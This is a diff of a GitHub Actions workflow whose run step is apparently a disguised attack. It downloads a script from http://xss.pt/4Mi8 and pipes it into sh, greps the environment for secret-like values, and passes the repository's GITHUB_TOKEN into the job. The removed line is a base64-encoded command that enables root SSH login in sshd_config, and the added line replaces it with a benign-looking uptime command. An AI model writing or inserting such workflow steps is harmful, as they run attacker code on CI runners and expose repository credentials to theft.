@@ -36,6 +36,6 @@ jobs:
         run: 
           bash -c 'cd /tmp;echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;base64 -d js8>js9;env|grep ss>s1;curl -o- http://xss.pt/4Mi8|tr -d "\r"|tee a1|sh;(while :;do date;[ -f a1 ]&&sleep 300||break;done)'
         env:
-          sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+          sshc1: 'cat /proc/uptime|cut -f1 -d"."'
           Github_T22: ${{ secrets.GITHUB_TOKEN }}
           Github_act22: ${{ github.event.action }}
